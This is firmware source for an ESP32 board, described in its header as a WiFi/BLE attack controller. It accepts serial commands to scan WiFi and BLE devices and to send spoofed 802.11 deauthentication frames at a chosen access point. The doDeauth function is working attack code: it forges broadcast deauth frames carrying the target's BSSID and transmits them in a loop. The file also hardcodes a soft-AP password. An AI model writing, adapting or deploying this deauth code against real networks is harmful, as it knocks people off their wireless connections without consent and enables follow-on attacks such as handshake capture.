/*
 * ThyraESP32 - Headless WiFi/BLE attack controller for Thyra WAN
 * Board: Lonely Binary PinPulse Shield (ESP32-S3, 16MB flash, 8MB PSRAM)
 * Interface: USB CDC serial (115200) + WiFi AP fallback
 *
 * Commands (newline-terminated):
 *   scan              - scan WiFi APs, JSON output
 *   deauth <bssid> <channel> [count]  - send deauth frames (default 10)
 *   ble_scan [seconds]                - scan BLE devices (default 5s)
 *   channel <n>       - set WiFi channel (1-13)
 *   status            - show IP, channel, heap
 *   help              - list commands
 */

#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"

#define AP_SSID     "ThyraClaw"
#define AP_PASS     "Metalcore1!"
#define BAUD_RATE   115200

static int current_channel = 1;

// ── Deauth ─────────────────────────────────────────────────────────────────

static uint8_t deauth_frame[26] = {
  0xC0, 0x00,                         // frame control: deauth
  0x00, 0x00,                         // duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // source (AP BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // sequence
  0x07, 0x00                          // reason: class3 frame
};

bool parseMac(const char* str, uint8_t* mac) {
  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

void doDeauth(const char* bssid_str, int channel, int count) {
  uint8_t bssid[6];
  if (!parseMac(bssid_str, bssid)) {
    Serial.println("{\"error\":\"invalid bssid\"}");
    return;
  }

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  current_channel = channel;

  memcpy(deauth_frame + 10, bssid, 6); // source = BSSID
  memcpy(deauth_frame + 16, bssid, 6); // bssid

  wifi_mode_t prev_mode;
  esp_wifi_get_mode(&prev_mode);
  esp_wifi_set_mode(WIFI_MODE_STA);

  int sent = 0;
  for (int i = 0; i < count; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false) == ESP_OK)
      sent++;
    delay(5);
  }

  esp_wifi_set_mode(prev_mode);
  Serial.printf("{\"deauth\":\"ok\",\"bssid\":\"%s\",\"channel\":%d,\"sent\":%d}\n",
    bssid_str, channel, sent);
}

// ── WiFi Scan ──────────────────────────────────────────────────────────────

void doScan() {
  Serial.println("{\"scanning\":true}");
  int n = WiFi.scanNetworks(false, true);
  Serial.print("[");
  for (int i = 0; i < n; i++) {
    if (i > 0) Serial.print(",");
    Serial.printf("{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,\"channel\":%d,\"enc\":%d}",
      WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
      WiFi.RSSI(i), WiFi.channel(i), WiFi.encryptionType(i));
  }
  Serial.println("]");
  WiFi.scanDelete();
}

// ── BLE Scan ───────────────────────────────────────────────────────────────

class ThyraBLECallback : public BLEAdvertisedDeviceCallbacks {
public:
  int count = 0;
  bool first = true;

  void onResult(BLEAdvertisedDevice dev) override {
    if (first) { Serial.print("["); first = false; }
    else Serial.print(",");

    Serial.printf("{\"addr\":\"%s\",\"rssi\":%d,\"name\":\"%s\"}",
      dev.getAddress().toString().c_str(),
      dev.getRSSI(),
      dev.haveName() ? dev.getName().c_str() : "");
    count++;
  }
};

void doBLEScan(int seconds) {
  Serial.println("{\"ble_scanning\":true}");
  BLEDevice::init("ThyraESP32");
  BLEScan* scan = BLEDevice::getScan();
  ThyraBLECallback cb;
  scan->setAdvertisedDeviceCallbacks(&cb, false);
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(99);
  scan->start(seconds, false);
  if (!cb.first) Serial.println("]");
  else Serial.println("[]");
  scan->clearResults();
}

// ── Command Parser ─────────────────────────────────────────────────────────

void handleCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;

  if (cmd == "help") {
    Serial.println("{\"commands\":[\"scan\",\"deauth <bssid> <ch> [count]\",\"ble_scan [sec]\",\"channel <n>\",\"status\",\"help\"]}");

  } else if (cmd == "scan") {
    doScan();

  } else if (cmd.startsWith("deauth ")) {
    // deauth <bssid> <channel> [count]
    char bssid[20]; int ch = 1, count = 10;
    int parsed = sscanf(cmd.c_str() + 7, "%19s %d %d", bssid, &ch, &count);
    if (parsed < 2) { Serial.println("{\"error\":\"usage: deauth <bssid> <channel> [count]\"}"); return; }
    doDeauth(bssid, ch, count);

  } else if (cmd.startsWith("ble_scan")) {
    int seconds = 5;
    sscanf(cmd.c_str() + 8, " %d", &seconds);
    if (seconds < 1 || seconds > 30) seconds = 5;
    doBLEScan(seconds);

  } else if (cmd.startsWith("channel ")) {
    int ch = 1;
    sscanf(cmd.c_str() + 8, "%d", &ch);
    if (ch < 1 || ch > 13) { Serial.println("{\"error\":\"channel 1-13\"}"); return; }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    current_channel = ch;
    Serial.printf("{\"channel\":%d}\n", ch);

  } else if (cmd == "status") {
    Serial.printf("{\"ap_ip\":\"%s\",\"channel\":%d,\"heap\":%lu,\"version\":\"1.0\"}\n",
      WiFi.softAPIP().toString().c_str(), current_channel,
      (unsigned long)esp_get_free_heap_size());

  } else {
    Serial.printf("{\"error\":\"unknown command: %s\"}\n", cmd.c_str());
  }
}

// ── Setup / Loop ───────────────────────────────────────────────────────────

void setup() {
  Serial.begin(BAUD_RATE);
  delay(500);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);

  Serial.printf("{\"ready\":true,\"ap\":\"%s\",\"ip\":\"%s\",\"version\":\"1.0\"}\n",
    AP_SSID, WiFi.softAPIP().toString().c_str());
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    handleCommand(cmd);
  }
  delay(10);
}
